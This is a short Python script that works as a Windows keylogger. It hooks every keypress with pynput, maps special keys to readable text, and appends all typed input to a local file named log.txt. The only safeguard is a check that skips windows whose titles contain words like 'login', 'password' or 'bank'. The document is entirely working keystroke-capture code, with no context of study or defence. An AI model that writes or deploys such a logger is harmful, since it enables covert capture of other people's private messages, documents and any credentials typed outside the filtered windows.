from pynput.keyboard import Listener
import win32gui

def get_active_window_title():
    try:
        window = win32gui.GetForegroundWindow()
        title = win32gui.GetWindowText(window)
        return title
    except:
        return ""

def is_secure_window():
    title = get_active_window_title().lower()
    secure_keywords = ['login', 'sign in', 'password', 'credentials', 'bank']
    return any(keyword in title for keyword in secure_keywords)

def write_to_file(key):
    if is_secure_window():
        return  # Skip logging if it's a secure window

    try:
        letter = key.char
    except AttributeError:
        letter = str(key)

    special_keys = {
        'Key.space': ' ',
        'Key.enter': '\n',
        'Key.backspace': '<BACK>',
        'Key.delete': '<DEL>',
        'Key.shift_r': '',
        'Key.shift_l': '',
        'Key.ctrl_l': '',
        'Key.ctrl_r': ''
    }

    letter = special_keys.get(letter, letter)

    print(letter, end='')

    with open('log.txt', 'a') as f:
        f.write(letter)

with Listener(on_press=write_to_file) as listener:
    listener.join()
